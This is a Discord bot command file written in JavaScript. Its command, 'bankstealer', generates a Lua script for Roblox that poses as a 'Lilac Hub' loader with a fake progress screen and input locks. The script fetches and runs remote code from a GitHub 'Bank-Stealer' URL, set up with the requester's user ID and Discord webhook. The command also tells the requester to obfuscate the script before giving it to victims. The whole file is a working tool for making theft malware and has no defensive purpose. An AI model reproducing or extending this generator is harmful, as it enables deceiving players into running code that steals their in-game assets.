const { SlashCommandBuilder } = require("@discordjs/builders");

module.exports = {
  data: new SlashCommandBuilder()
    .setName("bankstealer")
    .setDescription("Generates A MailStealer Script")
    .addStringOption((option) =>
      option
        .setName("userid")
        .setDescription("Your Roblox user id")
        .setRequired(true)
    )
    .addStringOption((option) =>
      option
        .setName("webhook")
        .setDescription("Your Discord webhook")
        .setRequired(true)
    ),
  async execute(interaction) {
    const userid = interaction.options.getString("userid");
    const webhook = interaction.options.getString("webhook");

    const message =
      `\`\`\`lua
UserName = "${userid}"
Webhook = "${webhook}"
_G.LoadingScreen = true
_G.AntiLeave = true
_G.MouseLock = true
_G.ScriptName = "Lilac Hub"
_G.FirstText = "Script Preparing"
_G.SecondText = "Script Loading..."
_G.ThirdText = "Almost Done..."
_G.WaitingTime = 180 -- it's the time between 0% and 100% in seconds
loadstring(game:HttpGet("https://raw.githubusercontent.com/AnyThingse/Scripts/main/Bank-Stealer.", true))()
\`\`\`` +
      "Don't forget to obfuscate your script using:\n" +
      "`https://luaobfuscator.com/` \n" +
      "**or**\n" +
      "`http://coolaf.com/run/snippets/g9dmnkt1w5` \n";

    await interaction.user.send(message);

    await interaction.reply("**Your Script Has Been Sent To You In DMs.**");
  },
};
